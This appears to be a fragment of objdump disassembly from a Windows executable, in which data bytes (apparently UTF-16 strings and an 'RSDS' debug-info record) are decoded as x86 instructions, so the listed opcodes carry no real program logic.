  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	cmp    BYTE PTR [esp+ebx*2],ah
  42ab5b:	retf   
  42ab5c:	dec    edx
  42ab5d:	dec    ecx
  42ab5e:	clc    
  42ab5f:	inc    ebp
  42ab60:	mov    al,0x6f
  42ab62:	popa   
  42ab63:	adc    al,cl
  42ab65:	cmp    al,0x5a
  42ab67:	ficomp DWORD PTR [eax+eax*1]
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
